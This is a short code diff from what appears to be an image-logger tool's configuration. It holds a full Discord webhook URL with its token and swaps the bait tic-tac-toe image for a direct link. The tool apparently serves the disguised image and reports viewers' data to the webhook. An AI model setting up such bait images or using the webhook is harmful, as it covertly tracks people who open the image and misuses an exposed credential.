@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1077722437996781690/YciV38h-NOhHw2A5Y9HUNSJp9gti2A4-TqL0uZvHJhL1Z-wNF-WUlihfi5u9B2laqph8",
-    "image": "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.thegamegal.com%2F2018%2F09%2F01%2Fultimate-tic-tac-toe%2F&psig=AOvVaw1PJHJlDo_rgUaqApY_F4A7&ust=1677263217302000&source=images&cd=vfe&ved=0CBAQjRxqFwoTCPjMxcSirP0CFQAAAAAdAAAAABAE", # You can also have a custom image by using a URL argument
+    "image": "https://i0.wp.com/www.thegamegal.com/wp-content/uploads/2018/08/ultimate-tic-tac-toe12-01.png?resize=340%2C340&ssl=1", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
